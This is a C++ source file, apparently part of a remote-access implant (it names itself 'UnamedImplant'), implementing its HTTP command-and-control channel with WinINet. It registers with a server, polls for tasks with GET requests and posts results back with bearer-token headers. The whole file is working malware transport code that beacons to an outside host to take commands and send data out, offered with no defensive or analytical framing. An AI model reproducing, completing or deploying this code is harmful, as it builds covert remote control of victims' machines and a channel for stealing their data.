#include "Windows.h"
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")

#include "HTTP.h"
#include "Config.h"
#include "Helper.h"

#define WINHTTP_ADDREQ_FLAG_ADD                      0x20000000



int prep(State* state) { // preps request

	DWORD port = atoi(state->port.c_str());
	DWORD timeout = HTTP_Timeout;
	if (!InternetSetOptionA(NULL, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout)))
		err("Error Setting Options");
	
	HANDLE hInternet = InternetOpen(L"UnamedImplant - UA", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		err("Unable to Obtain Internet Handle");

	HANDLE hConnection = InternetConnectW(hInternet, convertCharArrayToLPCWSTR(state->domain.c_str()), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hConnection == NULL)
		err("Cannot Obtain Connection Handle");

	state->hConnection = hConnection;

	return 0;

}

std::string reader(HANDLE hHTTPrequest) {

	std::string response;
	response.clear();

	char buff[2048];
	DWORD dwBytesRead = 0;
	ZeroMemory(buff, sizeof(buff));

	while (InternetReadFile(hHTTPrequest, buff, sizeof(buff), &dwBytesRead) == TRUE && dwBytesRead != 0) {

		response.append(buff, dwBytesRead);
		if (dwBytesRead == 0)
			break;

	}

	if (!response.empty())
		response = cleaner(response); // decode && decrypt later

	return response;
	
}

std::string Get(State state) {

	LPCWSTR file = convertCharArrayToLPCWSTR(state.file.c_str());
	HANDLE hConnection = state.hConnection;
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION;

	HANDLE hHTTPrequest = HttpOpenRequest(hConnection, L"GET", file, L"HTTP/1.1", NULL, NULL, flags, NULL);
	if (hHTTPrequest == NULL)
		err("Cannot Obtain HTTP Handle");
	
	if (!state.uuid.empty()) {

		std::string header = std::string("Authorization: Bearer ") + state.uuid + std::string("\r\n");
		if (!HttpAddRequestHeadersA(hHTTPrequest, header.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD))
			err("Unable to add cookie header");

	}
	if (!HttpSendRequest(hHTTPrequest, NULL, NULL, NULL, NULL))
		err("Cannot Send HTTP Reqeust");

	return reader(hHTTPrequest);

}

VOID Post(State *state, std::string& outbound, BOOL reg) {

	LPCWSTR file;

	if (reg)
		file = convertCharArrayToLPCWSTR(REGISTER_ENDPOINT);
	else
		file = convertCharArrayToLPCWSTR(state->file.c_str());

	HANDLE hConnection = state->hConnection;
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION;

	HANDLE hHTTPrequest = HttpOpenRequest(hConnection, L"POST", file, L"HTTP/1.1", NULL, NULL, flags, NULL);
	if (hHTTPrequest == NULL)
		err("Cannot Obtain HTTP Handle");



	if (!state->uuid.empty()) {

		std::string header = std::string("Authorization: Bearer ") + state->uuid + std::string("\r\n");
		if (!HttpAddRequestHeadersA(hHTTPrequest, header.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD))
			err("Unable to add cookie header");

	}
	if (!HttpAddRequestHeadersW(hHTTPrequest, L"Content-Type: application/x-www-form-urlencoded", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD))
		err("Unable to Add Request Header");
		
	if (!HttpSendRequest(hHTTPrequest, NULL, NULL, (LPVOID)outbound.c_str(), (DWORD) outbound.length()))
		err("Cannot Send HTTP Reqeust");
	
	if (reg) {

		std::string data = reader(hHTTPrequest);
		
		if (!data.empty()) // deserialize if not empty 
			regSerDeSer(state, data, reg);

	}


	InternetCloseHandle(hHTTPrequest);
	
	outbound = "";

}



BOOL Callback(State state, std::string &inbound, std::string &outbound) {
	
	
	if (!outbound.empty()) {

		Post(&state, outbound, false);
		return true;
	}

	inbound = Get(state);
	return true;

}

BOOL regimp(State* state) {

	std::string serialized;
	regSerDeSer(state, serialized, FALSE);
	std::string outbound = CALLBACK_UPLOADPARAM + std::string("=") + Encode(serialized);
	Post(state, outbound, true);

	
	return true;

}